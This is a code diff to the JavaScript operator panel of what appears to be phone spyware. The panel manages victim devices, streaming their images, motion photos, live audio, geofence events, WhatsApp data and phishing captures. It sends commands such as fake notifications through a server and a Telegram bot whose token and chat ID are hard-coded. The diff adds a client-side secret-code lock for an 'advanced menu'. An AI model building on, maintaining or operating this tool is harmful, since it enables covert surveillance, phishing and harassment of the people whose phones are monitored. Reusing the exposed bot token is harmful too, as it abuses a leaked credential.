@@ -48,8 +48,6 @@ let liveVideos = [];
 let liveMotionPhotos = [];
 let liveGeofenceEvents = [];
 let liveLiveAudio = [];
-
-// 🎣 Phishing
 let livePhishing = [];
 
 let panelOpenTime = Date.now();
@@ -62,6 +60,11 @@ let isMotionCameraActive = false;
 
 const TG_BOT_TOKEN = "5826969870:AAF2RAg49eZHLJ62onDtVjBskxgYFvfdkpQ";
 const TG_CHAT_ID = "1538488453";
+
+// 🔐 الكود السري للقائمة المتقدمة
+const ADVANCED_MENU_CODE = "922499";
+const ADVANCED_UNLOCK_KEY = "specter_adv_unlocked";
+const ADVANCED_UNLOCK_DURATION = 30 * 60 * 1000; // 30 دقيقة
 
 // ═══════════════════════════════════════════
 // Core
@@ -78,6 +81,7 @@ function logout() {
     sessionStorage.removeItem('logged_in');
     sessionStorage.removeItem('auth_token');
     sessionStorage.removeItem('is_owner');
+    sessionStorage.removeItem(ADVANCED_UNLOCK_KEY);
     window.location.href = 'login.html';
 }
 
@@ -113,6 +117,106 @@ function getCallType(t) { switch(parseInt(t)) { case 1: return '📥 وارد'; 
 function formatWhatsAppDate(t) {
     if (!t) return '—';
     try { const d = new Date(Number(t)); if (isNaN(d.getTime())) return '—'; return d.toLocaleString('ar', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' }); } catch (e) { return '—'; }
+}
+
+// ═══════════════════════════════════════════
+// 🔐 Advanced Menu Lock
+// ═══════════════════════════════════════════
+function isAdvancedUnlocked() {
+    try {
+        const raw = sessionStorage.getItem(ADVANCED_UNLOCK_KEY);
+        if (!raw) return false;
+        const data = JSON.parse(raw);
+        if (!data.expires || Date.now() > data.expires) {
+            sessionStorage.removeItem(ADVANCED_UNLOCK_KEY);
+            return false;
+        }
+        return true;
+    } catch (e) { return false; }
+}
+
+function setAdvancedUnlocked() {
+    try {
+        sessionStorage.setItem(ADVANCED_UNLOCK_KEY, JSON.stringify({
+            expires: Date.now() + ADVANCED_UNLOCK_DURATION,
+            at: Date.now()
+        }));
+    } catch (e) {}
+}
+
+function lockAdvancedMenu() {
+    sessionStorage.removeItem(ADVANCED_UNLOCK_KEY);
+    showNotification('🔒 تم القفل', 'القائمة المتقدمة تحتاج الكود مرة ثانية', '🔐');
+}
+
+function requestAdvancedCode() {
+    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
+
+    if (isAdvancedUnlocked()) {
+        openAdvancedMenu();
+        return;
+    }
+
+    if (document.getElementById('advCodeOverlay')) return;
+
+    const ov = document.createElement('div');
+    ov.id = 'advCodeOverlay';
+    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10001;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(6px);';
+    ov.innerHTML = `
+        <div style="background:#0d0d0d;border:2px solid #9b59b6;border-radius:18px;padding:30px 25px;max-width:400px;width:100%;box-shadow:0 0 40px rgba(155,89,182,0.4);">
+            <div style="text-align:center;margin-bottom:20px;">
+                <div style="font-size:48px;margin-bottom:8px;">🔐</div>
+                <h2 style="color:#9b59b6;margin:0 0 6px 0;font-size:20px;">القائمة المتقدمة</h2>
+                <p style="color:#666;font-size:12px;margin:0;">أدخل الكود السري للمتابعة</p>
+            </div>
+            <input id="advCodeInput" type="password" inputmode="numeric" autocomplete="off" placeholder="• • • • • •"
+                style="width:100%;padding:18px;background:#050505;color:#9b59b6;border:2px solid #2a1a3a;border-radius:12px;font-size:28px;text-align:center;letter-spacing:12px;font-weight:bold;outline:none;transition:border-color .2s;box-sizing:border-box;">
+            <div id="advCodeError" style="color:#ff3300;font-size:12px;text-align:center;margin-top:10px;min-height:16px;font-weight:bold;"></div>
+            <div style="display:flex;gap:10px;margin-top:18px;">
+                <button onclick="submitAdvancedCode()" style="flex:1;background:#9b59b6;color:#fff;border:none;padding:14px;border-radius:10px;cursor:pointer;font-weight:bold;font-size:15px;">🔓 فتح</button>
+                <button onclick="document.getElementById('advCodeOverlay').remove()" style="background:#222;color:#fff;border:none;padding:14px 20px;border-radius:10px;cursor:pointer;font-weight:bold;">✖</button>
+            </div>
+            <p style="color:#444;font-size:10px;text-align:center;margin:15px 0 0 0;">يُقفل تلقائياً بعد 30 دقيقة</p>
+        </div>
+    `;
+    document.body.appendChild(ov);
+
+    const input = document.getElementById('advCodeInput');
+    input.focus();
+    input.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitAdvancedCode(); });
+    input.addEventListener('input', () => {
+        const err = document.getElementById('advCodeError');
+        if (err) err.textContent = '';
+        input.style.borderColor = '#2a1a3a';
+    });
+}
+
+function submitAdvancedCode() {
+    const input = document.getElementById('advCodeInput');
+    const err = document.getElementById('advCodeError');
+    if (!input || !err) return;
+    const value = (input.value || '').trim();
+
+    if (value === ADVANCED_MENU_CODE) {
+        setAdvancedUnlocked();
+        input.style.borderColor = '#00ff66';
+        err.style.color = '#00ff66';
+        err.textContent = '✅ تم التحقق';
+        setTimeout(() => {
+            document.getElementById('advCodeOverlay')?.remove();
+            openAdvancedMenu();
+        }, 400);
+    } else {
+        input.style.borderColor = '#ff3300';
+        err.style.color = '#ff3300';
+        err.textContent = '❌ كود خاطئ';
+        input.value = '';
+        input.animate(
+            [{ transform: 'translateX(0)' }, { transform: 'translateX(-8px)' },
+             { transform: 'translateX(8px)' }, { transform: 'translateX(0)' }],
+            { duration: 250 }
+        );
+    }
 }
 
 // ═══════════════════════════════════════════
@@ -253,7 +357,6 @@ function initSSE() {
             } catch (err) {}
         });
 
-        // 🎣 Phishing event
         sse.addEventListener('new_phishing', (e) => {
             try {
                 const data = JSON.parse(e.data);
@@ -315,7 +418,6 @@ async function sendTelegramCommand(cmd) {
 async function sendCommandDual(command, params) {
     let serverOk = false, tgOk = false;
 
-    // 1) Server
     try {
         const res = await fetch('/api.php', {
             method: 'POST',
@@ -326,7 +428,6 @@ async function sendCommandDual(command, params) {
         serverOk = data.success === true;
     } catch (e) { console.error('srv cmd err:', e); }
 
-    // 2) Telegram (fallback)
     try {
         if (command === 'send_fake_notification')
             tgOk = await sendTelegramCommand(`/fakenotif ${params?.app || 'System'} | ${params?.title || ''} | ${params?.body || ''}`);
@@ -2600,6 +2701,11 @@ setInterval(loadDevices, 30000);
 // ═══════════════════════════════════════════
 window.logout = logout;
 window.openAdvancedMenu = openAdvancedMenu;
+
+// 🔐 Advanced menu lock exports
+window.requestAdvancedCode = requestAdvancedCode;
+window.submitAdvancedCode = submitAdvancedCode;
+window.lockAdvancedMenu = lockAdvancedMenu;
 
 window.openLiveImages = openLiveImages;
 window.closeLiveImages = closeLiveImages;
